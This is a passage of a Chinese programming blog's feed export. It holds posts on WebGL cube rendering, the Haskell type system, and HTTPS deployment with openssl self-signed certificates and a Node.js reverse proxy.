class="comment">//中精度</span></span><br><span class="line">precision highp <span class="keyword">float</span>; <span class="comment">//高精度</span></span><br><span class="line">precision lowp <span class="keyword">float</span>; <span class="comment">//低精度</span></span><br></pre></td></tr></table></figure></p><h2 id="渲染过程"><a href="#渲染过程" class="headerlink" title="渲染过程"></a>渲染过程</h2><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/processgraph.png" alt=""></p><ol><li><p>对缓冲区对象的每个顶点，执行顶点着色器，将顶点坐标赋值给gl_Position后，顶点进入图形装配区域，暂存。</p></li><li><p>所有点传入后，根据绘制API第一个参数决定如何装配图形，然后装配出图形。</p></li><li><p>对装配出来的几何图形进行光栅化，对装配的几何图形用像素进行填充。</p></li><li><p>对光栅化后的图形进行逐片元调用片元着色器，片元着色器会根据片元坐标计算每个片元的信息，比如颜色，纹理像素等并写入颜色缓冲区。如这里的正方体，我们就在片元着色器里计算像素颜色值（在光照影响下），如果同一个表面的四个顶点颜色不同，会发现有一个渐变效果，这便是片元着色器进行插值计算的结果。</p></li><li><p>当所有片元的值计算完毕后，进行最终渲染。</p></li></ol><h2 id="initShaders"><a href="#initShaders" class="headerlink" title="initShaders()"></a>initShaders()</h2><p>这里绘制正方体参照《WebGL编程指南》并用了代码示例中的一些库文件，包括这里的initShaders():</p><ol><li>创建着色器对象(gl.createShader());</li><li>向着色器对象中填充着色器的源代码(gl.shaderSource());</li><li>编译着色器(gl.compileProgram());</li><li>创建程序对象（gl.createProgram());</li><li>为程序对象分配着色器(gl.attachShader());</li><li>连接程序对象(gl.linkProgram());</li><li>使用程序对象(gl.useProgram());</li></ol><p>详细细节参考《WebGL编程指南》</p><h2 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h2><p>可以看到，用原生WebGL API进行绘制是多么的麻烦，这里还引入了一些矩阵库，简化了矩阵转换细节。虽说麻烦，但是对于用来学习图形学基础知识还是不错的。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;从原生WebGL的角度分析一个立方体的产生。例子虽简单，但包含了好多基础概念哈哈，算是入门阶段的小小总结吧。&lt;/p&gt;
&lt;p&gt;首先来看看最终的效果 (♥◠‿◠)ﾉ：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xsi10.com1.z0.glb.clouddn.com/test.gif&quot; alt=&quot;&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="WebGL" scheme="http://luoxia.me/code/categories/WebGL/"/>
    
    
      <category term="WebGL" scheme="http://luoxia.me/code/tags/WebGL/"/>
    
      <category term="计算机图形学" scheme="http://luoxia.me/code/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9B%BE%E5%BD%A2%E5%AD%A6/"/>
    
  </entry>
  
  <entry>
    <title>Haskell类型系统</title>
    <link href="http://luoxia.me/code/2017/03/16/Haskell%E7%B1%BB%E5%9E%8B%E7%B3%BB%E7%BB%9F/"/>
    <id>http://luoxia.me/code/2017/03/16/Haskell类型系统/</id>
    <published>2017-03-16T01:32:24.000Z</published>
    <updated>2017-11-16T13:10:06.484Z</updated>
    
    <content type="html"><![CDATA[<p>这篇文章主要总结Haskell的类型系统。文章参照《Learn you a Haskell》。</p><a id="more"></a><h2 id="表达式类型"><a href="#表达式类型" class="headerlink" title="表达式类型"></a>表达式类型</h2><p>Int,Integer,Float,Double,Bool,Char,[]中各个项类型必须相同，()的类型跟其中的每一个元素的类型相关，只有每个元素对应类型相同，元素数目相同的两个Tuple类型才相同。</p><p>函数同样有类型声明。类型必须以大写开头。</p><h2 id="类型参数"><a href="#类型参数" class="headerlink" title="类型参数"></a>类型参数</h2><p>如<code>head</code>函数: <code>head :: [a] -&gt; a</code>，表示与具体类型无关</p><h2 id="typeclass"><a href="#typeclass" class="headerlink" title="typeclass"></a>typeclass</h2><p>如 <code>(==) :: Eq a =&gt; a -&gt; a -&gt; Bool</code>可以看到类型类约束<code>Eq a</code>,相当于interface定义行为</p><p>常见typeclass:</p><p>Eq:可判断相等性；Ord：可比较大小（必须先加入Eq)；Show：可以用字符串表示，Read：可以将一个字符串转换成某成员类型。（对于<code>read &quot;4&quot;</code>这种要加入类型注释:<code>read &quot;4&quot;::Int</code>）；Enum:可枚举，如<code>[&#39;a&#39;..&#39;e&#39;]</code>；Bounded:有一个上限和下限<code>minBound :: Int</code>: <code>-2147483648</code>；Num:具有数字特征，包含所有数字，如 <code>:t (*)</code>:<code>(*) :: (Num a) =&gt; a -&gt; a -&gt; a</code>；Integral:仅饱含整数，成员有:Int, Integer；Floating:仅包含Float,Double。</p><p>一个有用的函数<code>fromIntegral</code>：用于将Integral typeclass成员转换成更通用的<code>Num</code>　typeclass成员:<br><code>fromIntegral :: (Num b, Integral a) =&gt; a -&gt; b</code>，比如我们求一个List的length,再加上一个Float，就会报错，因为<code>length :: [a] -&gt; Int</code>，我们可以<code>fromIntegral (length [1,2,3,4]) + 3.2</code>来解决。</p><h2 id="构造自己的Types和Typeclasses"><a href="#构造自己的Types和Typeclasses" class="headerlink" title="构造自己的Types和Typeclasses"></a>构造自己的Types和Typeclasses</h2><h3 id="ADT（代数数据类型）"><a href="#ADT（代数数据类型）" class="headerlink" title="ADT（代数数据类型）"></a>ADT（代数数据类型）</h3><p>如Bool:<code>data Bool = False | True</code>,False,True就是值构造子，更复杂的例子:</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">Shape</span> = <span class="type">Circle</span> <span class="type">Float</span> <span class="type">Float</span> <span class="type">Float</span> | <span class="type">Rectangle</span> <span class="type">Float</span> <span class="type">Float</span> <span class="type">Float</span> <span class="type">Float</span></span></span><br></pre></td></tr></table></figure><p>其中Circle,Rectangle两个值构造子后面跟着三项，实际为参数，因为值构造子相当于函数，如<code>Circle :: Float -&gt; Float -&gt; Float -&gt; Shape</code></p><p>通过<code>deriving</code>将类型派生为指定<code>typeclass</code>的成员</p><p>ADT的每个值构造子的每个参数必须有具体类型</p><h3 id="Record-Syntax"><a href="#Record-Syntax" class="headerlink" title="Record Syntax"></a>Record Syntax</h3><p>例如表示一个人的type:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">Person</span> = <span class="type">Person</span> <span class="type">String</span> <span class="type">String</span> <span class="type">Int</span> <span class="type">Float</span> <span class="type">String</span> <span class="type">String</span> <span class="keyword">deriving</span> (<span class="type">Show</span>)</span></span><br></pre></td></tr></table></figure></p><p>分别表示firstName,lastName等等，我们要获取这些firstName啥的，还得这样:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title">firstName</span> :: <span class="type">Person</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">firstName</span> (<span class="type">Person</span> firstname _ _ _ _ _) = firstname</span><br></pre></td></tr></table></figure></p><p>显然麻烦，而解决方案:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">Person</span> = <span class="type">Person</span> &#123; <span class="title">firstName</span> :: <span class="type">String</span></span></span><br><span class="line"><span class="class">                     , <span class="title">lastName</span> :: <span class="type">String</span></span></span><br><span class="line"><span class="class">                     , <span class="title">age</span> :: <span class="type">Int</span></span></span><br><span class="line"><span class="class">                     , <span class="title">height</span> :: <span class="type">Float</span></span></span><br><span class="line"><span class="class">                     , <span class="title">phoneNumber</span> :: <span class="type">String</span></span></span><br><span class="line"><span class="class">                     , <span class="title">flavor</span> :: <span class="type">String</span></span></span><br><span class="line"><span class="class">                     &#125; <span class="keyword">deriving</span> (<span class="type">Show</span>)</span></span><br></pre></td></tr></table></figure></p><p>即自动创建了这些取值函数，如<code>firstName :: Person -&gt; String</code></p><h3 id="Type-parameters"><a href="#Type-parameters" class="headerlink" title="Type parameters"></a>Type parameters</h3><p>如<code>data Maybe a = Nothing | Just a</code>，<code>a</code>就是类型参数，这有点类似于C++的类模板，a可以是任意type。<code>Maybe</code>只是一个类型构造子，最终的type是根据a来的,如 <code>Just &quot;hey&quot; :: Maybe [Char]</code>。还有如<code>[]</code>，同样可以根据类型参数的实际type来构造不同的type：<code>[Char],[Int]</code>等。这种情况<code>read</code>的时候要加入完整的类型注释:<code>read &quot;Just &#39;t&#39;&quot; :: Maybe Char</code></p><p>永远不给类型参数加typeclass约束</p><p>类型构造子和值构造子的区分是相当重要的。在声明数据类型时，等号=左端的那个是类型构造子，右端的(中间可能有|分隔)都是值构造子。</p><h3 id="Derived-instances"><a href="#Derived-instances" class="headerlink" title="Derived instances"></a>Derived instances</h3><p>派生为指定typeclass的成员，如<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">Day</span> = <span class="type">Monday</span> | <span class="type">Tuesday</span> | <span class="type">Wednesday</span> | <span class="type">Thursday</span> | <span class="type">Friday</span> | <span class="type">Saturday</span> | <span class="type">Sunday</span></span></span><br><span class="line">           <span class="keyword">deriving</span> (<span class="type">Eq</span>, <span class="type">Ord</span>, <span class="type">Show</span>, <span class="type">Read</span>, <span class="type">Bounded</span>, <span class="type">Enum</span>)</span><br></pre></td></tr></table></figure></p><p>可以:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Thursday .. Sunday]</span><br><span class="line">[Thursday,Friday,Saturday,Sunday]</span><br><span class="line"></span><br><span class="line">[minBound .. maxBound] :: [Day]</span><br><span class="line">[Monday,Tuesday,Wednesday,Thursday,Friday,Saturday,Sunday]</span><br></pre></td></tr></table></figure></p><h3 id="Type-synonyms"><a href="#Type-synonyms" class="headerlink" title="Type synonyms"></a>Type synonyms</h3><p>类型同义词:<code>type String = [Char]</code></p><h3 id="Recursive-data-structures-递归地定义数据结构"><a href="#Recursive-data-structures-递归地定义数据结构" class="headerlink" title="Recursive data structures (递归地定义数据结构)"></a>Recursive data structures (递归地定义数据结构)</h3><p>比如一个List:<code>5:6:8:[]</code>即[5,6,8]：<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">infixr</span> <span class="number">5</span> :-:</span><br><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">List</span> a = <span class="type">Empty</span> | a :-: (<span class="type">List</span> <span class="title">a</span>) <span class="keyword">deriving</span> (<span class="type">Show</span>, <span class="type">Read</span>, <span class="type">Eq</span>, <span class="type">Ord</span>)</span></span><br></pre></td></tr></table></figure></p><p>再比如一个二叉树：<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">BinaryTree</span> a = <span class="type">Node</span> a (<span class="type">BinaryTree</span> <span class="title">a</span>) (<span class="type">BinaryTree</span> <span class="title">a</span>)</span></span><br><span class="line">                  | <span class="type">Empty</span></span><br><span class="line">                  <span class="keyword">deriving</span> (<span class="type">Show</span>)</span><br><span class="line"></span><br><span class="line"><span class="title">simpleTree</span> = <span class="type">Node</span> <span class="string">"parent"</span> (<span class="type">Node</span> <span class="string">"left child"</span> <span class="type">Empty</span> <span class="type">Empty</span>)</span><br><span class="line">                           (<span class="type">Node</span> <span class="string">"right child"</span> <span class="type">Empty</span> <span class="type">Empty</span>)</span><br></pre></td></tr></table></figure></p><h3 id="构造自己的typeclass和type-instance"><a href="#构造自己的typeclass和type-instance" class="headerlink" title="构造自己的typeclass和type instance"></a>构造自己的typeclass和type instance</h3><p>定义typeclass，如<code>Eq</code>:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Eq</span> a <span class="keyword">where</span></span></span><br><span class="line">    (==) :: a -&gt; a -&gt; <span class="type">Bool</span></span><br><span class="line">    (/=) :: a -&gt; a -&gt; <span class="type">Bool</span></span><br><span class="line">    x == y = not (x /= y)</span><br><span class="line">    x /= y = not (x == y)</span><br></pre></td></tr></table></figure></p><p>可以看到<code>==</code>和<code>x /= y</code>相互依赖定义，这样使得<code>Eq</code>的<code>minimal complete definition</code>成了<code>==</code>和<code>/=</code>其中一个，即只需要定义其中一个就能完整定义出<code>Eq</code>的instance了。比如:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">TrafficLight</span> = <span class="type">Red</span> | <span class="type">Yellow</span> | <span class="type">Green</span></span></span><br><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Eq</span> <span class="type">TrafficLight</span> <span class="keyword">where</span></span></span><br><span class="line">    <span class="type">Red</span> == <span class="type">Red</span> = <span class="type">True</span></span><br><span class="line">    <span class="type">Green</span> == <span class="type">Green</span> = <span class="type">True</span></span><br><span class="line">    <span class="type">Yellow</span> == <span class="type">Yellow</span> = <span class="type">True</span></span><br><span class="line">    _ == _ = <span class="type">False</span></span><br></pre></td></tr></table></figure></p><p>还可以定义sub typeclass:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> (<span class="type">Eq</span> <span class="title">m</span>) =&gt; <span class="type">Eq</span> (<span class="type">Maybe</span> <span class="title">m</span>) <span class="keyword">where</span></span></span><br><span class="line">    <span class="type">Just</span> x == <span class="type">Just</span> y = x == y</span><br><span class="line">    <span class="type">Nothing</span> == <span class="type">Nothing</span> = <span class="type">True</span></span><br><span class="line">    _ == _ = <span class="type">False</span></span><br></pre></td></tr></table></figure></p><h3 id="Kind"><a href="#Kind" class="headerlink" title="Kind"></a>Kind</h3><p>用于类型的类型。对于有类型参数的构造子如<code>Maybe a = Nothing | Just a</code>这种，<code>:k Maybe</code>就是:<code>*-&gt;*</code>即接受一个具体类型返回一个具体类型。</p><p>这里具体类型指有具体形态的，比如一个函数的类型声明:<code>:k Int -&gt; Int</code>结果是<code>*</code>，因为这是个具体的类型。对于没有类型参数的构造子，如<code>:k Int</code>结果就是<code>*</code></p><p>类型构造子可以做curry:<code>:k Either String</code>结果是<code>Either String :: * -&gt; *</code>。</p><p>就比如定义Functor的instance的时候，就必须接受一个<code>* -&gt; *</code>类型&gt;。</p><p>Functor:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="type">Functor</span> f <span class="keyword">where</span></span></span><br><span class="line">    fmap :: (a -&gt; b) -&gt; f a -&gt; f b</span><br></pre></td></tr></table></figure></p><p>看看这个类型:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">data</span> <span class="type">Barry</span> t k p = <span class="type">Barry</span> &#123; <span class="title">yabba</span> :: <span class="title">p</span>, <span class="title">dabba</span> :: <span class="title">t</span> <span class="title">k</span> &#125;</span></span><br></pre></td></tr></table></figure></p><p><code>Barry :: (* -&gt; *) -&gt; * -&gt; * -&gt; *</code></p><p>要想它成为functor，就必须:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">instance</span> <span class="type">Functor</span> (<span class="type">Barry</span> <span class="title">a</span> <span class="title">b</span>) <span class="keyword">where</span></span></span><br><span class="line">    fmap f (<span class="type">Barry</span> &#123;yabba = x, dabba = y&#125;) = <span class="type">Barry</span> &#123;yabba = f x, dabba = y&#125;</span><br></pre></td></tr></table></figure></p><p>因为<code>Barry a b</code>的Kind这个时候就是<code>* -&gt; *</code>。</p><h3 id="关键字”newtype”"><a href="#关键字”newtype”" class="headerlink" title="关键字”newtype”"></a>关键字”newtype”</h3><p>将现有类型包装为新的类型。</p><p>比如对于<code>ZipList</code>:<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">newtype</span> <span class="type">ZipList</span> a = <span class="type">ZipList</span> &#123;<span class="title">getZipList</span> :: [<span class="title">a</span>]&#125;</span></span><br></pre></td></tr></table></figure></p><p>不过是将<code>[]</code>进行了包装，而这么做的意义是，因为对原有类型的包装得来的新类型不会自动成为原类型定义的那些typeclass的instance。比如原有<code>[]</code>对于<code>Applicative instance</code>的<code>&lt;*&gt;</code>实现是一种交叉结合的方式，如果需要换种方式实现，就可以用我们的新的类型<code>ZipList</code>。</p><p>On newtype laziness</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">newtype</span> <span class="type">CoolBool</span> = <span class="type">CoolBool</span> &#123;<span class="title">getCoolBool</span> :: <span class="type">Bool</span>&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="title">helloMe</span> :: <span class="type">CoolBool</span> -&gt; <span class="type">String</span></span><br><span class="line"><span class="title">helloMe</span> (<span class="type">CoolBool</span> _) = <span class="string">"hello"</span></span><br></pre></td></tr></table></figure><p>然后我们<code>helloMe undefined</code>结果正常为”hello”,不同于<code>data</code>定义的时候抛出错误。</p><p>因为这里进行模式匹配的时候不用进行值构造子的计算。当我们使用 newtype 的时候，Haskell 内部可以将新的类型用旧的类型来表示。他不必加入另一层 box 来包住旧有的类型。他只要注意他是不同的类型就好了。而且 Haskell 会知道 newtype 定义的类型一定只会有一个构造子，他不必计算喂给函数的值就能确定他是 (CoolBool _) 的形式，因为 newtype 只有一个可能的值跟单一字段！</p><h2 id="关于多态"><a href="#关于多态" class="headerlink" title="关于多态"></a>关于多态</h2><p>与其他语言进行对比总结。</p><p>C++中：<br>多态分为编译时多态（静态多态）和运行时多态（动态多态），而真正意义上的多态实际上只有运行时多态，通过虚函数和继承实现，即属于晚绑定，在运行时函数调用地址才能确定。</p><p>针对编译时多态，有模板，函数（操作符）重载(即Ad-hoc多态），模板特化，Duck Typing。</p><p>运行时多态：<a href="http://blog.csdn.net/hackbuteer1/article/details/7475622" target="_blank" rel="noopener">http://blog.csdn.net/hackbuteer1/article/details/7475622</a></p><p>haskell中：</p><p><strong>参数化多态：</strong></p><p>Prelude&gt; :type last<br>last :: [a] -&gt; a</p><p>可以看到last函数的类型签名包含类型变量，不在意具体的类型，对应C++的模板（函数模板，类模板）即泛型实现</p><p><strong>ad-hoc多态：</strong><br>这里的ad-hoc多态与C++有一定区别，因为在haskell中通过type class来实现，而type class又类似于C++的虚函数，每个instance对type class定义的函数都有自己的实现。这勉强叫做“函数重载”，这或许就是它被称为ad-hoc多态的原因。而在C++中ad-hoc多态和虚函数多态完全不一样的。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>实践过程中经常碰到类型转换问题，由于强类型的原因，遇到了很多麻烦，这里占个坑，需要补充这方面的解决方案。</p><p><img src="http://upload-images.jianshu.io/upload_images/1023733-27c30ca1b9b1af69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="http://upload-images.jianshu.io/upload_images/1023733-27c30ca1b9b1af69.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></p><h3 id="数值类型转换："><a href="#数值类型转换：" class="headerlink" title="数值类型转换："></a>数值类型转换：</h3><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>Haskell有一套强大的类型系统，虽然是functional,OO的有些思想却在其中有一些体现。</p><p>详情参考书籍<a href="https://learnyoua.haskell.sg/content/zh-cn" target="_blank" rel="noopener">https://learnyoua.haskell.sg/content/zh-cn</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章主要总结Haskell的类型系统。文章参照《Learn you a Haskell》。&lt;/p&gt;
    
    </summary>
    
      <category term="Haskell" scheme="http://luoxia.me/code/categories/Haskell/"/>
    
    
      <category term="Haskell" scheme="http://luoxia.me/code/tags/Haskell/"/>
    
      <category term="functional" scheme="http://luoxia.me/code/tags/functional/"/>
    
  </entry>
  
  <entry>
    <title>Let&#39;s Encrypt</title>
    <link href="http://luoxia.me/code/2017/03/13/Let-s-Encrypt/"/>
    <id>http://luoxia.me/code/2017/03/13/Let-s-Encrypt/</id>
    <published>2017-03-13T09:03:26.000Z</published>
    <updated>2017-11-16T13:10:06.485Z</updated>
    
    <content type="html"><![CDATA[<p>迁移到HTTPS已经成为必然，许多API已经必须部署HTTPS才能使用，如我之前分享过的WebRTC等，ios已经强制app使用HTTPS,HTTP2.0必须基于HTTPS之上。。。</p><p>那么这篇文章分享下HTTPS系列之实战部署，从Node server和Nginx Server两种情景来分析。</p><a id="more"></a><h1 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h1><p>上篇文章的TLS原理篇提到了证书，用于安全交换公钥，包含了证书订阅者信息，以及CA的数字签名（HASH + 私钥加密，上篇有讲）。</p><h3 id="字段"><a href="#字段" class="headerlink" title="字段"></a>字段</h3><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/certificateshow.jpg" alt="certificate"><br>证书字段包含了版本，序列号，签名算法，颁发者，颁发对象，有效期，使用者公钥，证书扩展等信息。</p><h3 id="证书链"><a href="#证书链" class="headerlink" title="证书链"></a>证书链</h3><p>根CA -&gt; 中间CA(可能多个) -&gt; 最终实体证书</p><p>client（即信赖方）会存放知名根CA的证书。当server发送过来自己的证书时，client会由该证书知道颁发它的上一级CA的证书，接着从上一级的证书里找到再上一级的证书，一级一级直到根CA证书进行验证。</p><h3 id="证书吊销"><a href="#证书吊销" class="headerlink" title="证书吊销"></a>证书吊销</h3><p><strong>CRL（证书吊销列表）</strong>，这个列表记录了未过期但是已经被吊销的证书,之前证书字段里的CRL分发点就用于记录CRL地址</p><p><strong>OCSP（在线证书状态协议）</strong>支持实时查询</p><h1 id="用openssl生成自签名证书"><a href="#用openssl生成自签名证书" class="headerlink" title="用openssl生成自签名证书"></a>用openssl生成自签名证书</h1><h3 id="生成server-RSA私钥"><a href="#生成server-RSA私钥" class="headerlink" title="生成server RSA私钥:"></a>生成server RSA私钥:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl genrsa -out server.key 1024</span><br></pre></td></tr></table></figure><h3 id="生成server-RSA公钥"><a href="#生成server-RSA公钥" class="headerlink" title="生成server RSA公钥:"></a>生成server RSA公钥:</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl rsa -in server.key -pubout -out server.pem</span><br></pre></td></tr></table></figure><h3 id="CA准备"><a href="#CA准备" class="headerlink" title="CA准备"></a>CA准备</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ openssl genrsa -out ca.key 1024 //生成CA私钥</span><br><span class="line">$ openssl req -new -key ca.key -out ca.csr //通过CA私钥生成证书申请文件</span><br><span class="line">$ openssl x509 -req -in ca.csr  -signkey ca.key -out ca.crt //生成CA证书</span><br></pre></td></tr></table></figure><h3 id="用CA颁发server证书"><a href="#用CA颁发server证书" class="headerlink" title="用CA颁发server证书"></a>用CA颁发server证书</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ openssl req -new -key server.key -out server.csr //通过server私钥生成证书申请文件</span><br><span class="line">$ openssl x509 -req -CA ca.crt -CAkey ca.key -CAcreateserial -in server.csr -out server.crt //生成server 证书</span><br></pre></td></tr></table></figure><p>生成成功:<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/generate.jpg" alt="generate"></p><h1 id="Node-server部署HTTPS"><a href="#Node-server部署HTTPS" class="headerlink" title="Node server部署HTTPS"></a>Node server部署HTTPS</h1><h3 id="用http-proxy做反向代理，HTTPS-gt-HTTP-起多个服务"><a href="#用http-proxy做反向代理，HTTPS-gt-HTTP-起多个服务" class="headerlink" title="用http-proxy做反向代理，HTTPS-&gt;HTTP,起多个服务"></a>用http-proxy做反向代理，HTTPS-&gt;HTTP,起多个服务</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> https = <span class="built_in">require</span>(<span class="string">'https'</span>);</span><br><span class="line"><span class="keyword">const</span> proxy = <span class="built_in">require</span>(<span class="string">'http-proxy'</span>).createProxyServer(&#123;&#125;);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> options = &#123;</span><br><span class="line">    key: fs.readFileSync(<span class="string">'./keys/server.key'</span>),</span><br><span class="line">    cert: fs.readFileSync(<span class="string">'./keys/server.crt'</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> server = https.createServer(options,(req,res)=&gt;&#123;</span><br><span class="line">    <span class="keyword">const</span> host = req.headers.host,</span><br><span class="line">        ip = req.headers[<span class="string">'x-forwarded-for'</span>] || req.connection.remoteAddress;</span><br><span class="line">    <span class="keyword">switch</span>(host)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'test.localhost'</span>:</span><br><span class="line">            proxy.web(req,res,&#123;</span><br><span class="line">                target: <span class="string">'http://localhost:3000'</span>,</span><br><span class="line">                ssl: &#123;</span><br><span class="line">                    key: fs.readFileSync(<span class="string">'./keys/server.key'</span>, <span class="string">'utf8'</span>),</span><br><span class="line">                    cert: fs.readFileSync(<span class="string">'./keys/server.crt'</span>, <span class="string">'utf8'</span>)</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            res.writeHead(<span class="number">200</span>);</span><br><span class="line">            res.end(<span class="string">'welcome to node https proxy server'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;).listen(<span class="number">443</span>);</span><br></pre></td></tr></table></figure><h3 id="将HTTP的80端口请求重定向到HTTPS的443端口"><a href="#将HTTP的80端口请求重定向到HTTPS的443端口" class="headerlink" title="将HTTP的80端口请求重定向到HTTPS的443端口"></a>将HTTP的80端口请求重定向到HTTPS的443端口</h3><p>在client输入网址默认是http协议的，所以需要重定向一下<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> httpServer = http.createServer(<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    res.writeHead(<span class="number">301</span>,&#123;</span><br><span class="line">        <span class="string">'Location'</span>: <span class="string">`https://<span class="subst">$&#123;req.headers.host&#125;</span><span class="subst">$&#123;req.url&#125;</span>`</span></span><br><span class="line">    &#125;)</span><br><span class="line">    res.end();</span><br><span class="line">&#125;)</span><br><span class="line">httpServer.listen(<span class="number">80</span>);</span><br><span class="line">httpServer.on(<span class="string">'listening'</span>,()=&gt;&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">'the http server has been listened at port 80'</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></p><h3 id="综合代码"><a href="#综合代码" class="headerlink" title="综合代码"></a>综合代码</h3><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span 